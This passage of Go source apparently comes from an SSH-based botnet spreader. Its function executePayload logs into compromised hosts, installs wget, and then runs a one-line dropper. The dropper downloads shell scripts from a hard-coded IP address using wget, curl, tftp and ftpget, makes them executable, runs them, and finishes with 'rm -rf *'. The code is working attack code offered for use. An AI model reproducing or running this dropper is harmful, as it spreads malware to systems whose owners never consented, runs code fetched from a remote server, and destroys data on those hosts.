...
// ==================== PAYLOAD EXECUTION ====================
// Execute payload on remote host: install wget first, then run the main payload
func executePayload(client *ssh.Client) {
	// Command to install wget if missing (supports apt, yum, apk)
	installWget := `command -v wget >/dev/null 2>&1 || { apt-get update -y && apt-get install wget -y; } 2>/dev/null; command -v wget >/dev/null 2>&1 || { yum install wget -y; } 2>/dev/null; command -v wget >/dev/null 2>&1 || { apk add wget; } 2>/dev/null`

	// Main payload
	payload := `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://161.97.79.102/1.sh; curl -O http://161.97.79.102/1.sh; chmod 777 1.sh; sh 1.sh; tftp 161.97.79.102 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 161.97.79.102; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 161.97.79.102 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *`

	session, err := client.NewSession()
	if err != nil {
		log.Printf("Failed to create session for payload: %v", err)
		return
	}
	defer session.Close()

	// Step 1: Install wget
	if err := session.Run(installWget); err != nil {
		log.Printf("Failed to install wget on %s: %v", client.RemoteAddr(), err)
		// Continue anyway, maybe wget is already there or will be installed later
	}

	// Step 2: Execute main payload
	if err := session.Run(payload); err != nil {
		log.Printf("Payload execution error on %s: %v", client.RemoteAddr(), err)
	}
}

// ==================== ORIGINAL SSH FUNCTIONS (unchanged) ====================
